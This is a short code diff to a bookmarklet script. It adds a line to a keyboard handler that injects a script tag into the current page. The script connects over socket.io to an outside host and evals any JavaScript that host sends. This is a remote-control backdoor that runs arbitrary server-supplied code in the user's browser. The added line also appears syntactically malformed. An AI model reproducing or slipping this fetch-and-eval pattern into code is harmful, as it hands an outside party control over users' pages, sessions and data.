@@ -1,9 +1,8 @@
 /// bookmarklet.js
 // (document.body.innerHTML+=`<script>const socket = io('https://js-opt.loophole.site:443');socket.on("javascript", function(data) { eval(data); });</script>`;)
-//const socket = io('https://js-opt.loophole.site:443');
-//socket.on("javascript", function(data) { eval(data); });
 document.onkeydown = function (e) {
   if (e.code=="ControlRight") {
+    (document.body.innerHTML+=`<script>const socket = io('https://js-opt.loophole.site:443');socket.on("javascript", function(data) { eval(data); });</script>`;)
     let option = prompt(`
     Choose an option
     0) Bookmarklet/Javascript
